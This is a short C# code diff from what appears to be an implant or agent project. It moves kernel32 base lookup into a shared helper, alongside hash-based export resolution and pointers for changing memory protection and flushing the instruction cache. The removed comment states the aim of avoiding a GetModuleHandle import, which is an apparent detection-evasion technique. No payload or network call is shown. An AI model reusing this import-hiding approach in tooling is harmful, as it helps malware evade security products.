@@ -159,17 +159,11 @@ namespace CSharpAgent
         private static ProtectMemoryFn _protectMemory;
         private static FlushICacheFn _flushICache;
 
-        // kernel32's base WITHOUT a GetModuleHandle import: the managed module enumeration
-        // (System.dll — already the single assembly reference) names every loaded module.
-        // In a WOW64 process it lists the 32-bit kernel32 — the one whose exports this
-        // 32-bit code can actually call — so bitness always matches the process.
+        // kernel32's base via the shared dynamic-resolution core in NativeInterop
+        // (audit No.21) — same managed module enumeration, one home for the ladder.
         private static IntPtr Kernel32Base()
         {
-            var modules = System.Diagnostics.Process.GetCurrentProcess().Modules;
-            for (var i = 0; i < modules.Count; i++)
-                if (string.Compare(modules[i].ModuleName, "kernel32.dll", true) == 0)
-                    return modules[i].BaseAddress;
-            return IntPtr.Zero;
+            return NativeImports.ModuleBase("kernel32.dll");
         }
 
         private static IntPtr ResolveKernel32Export(uint eHash)
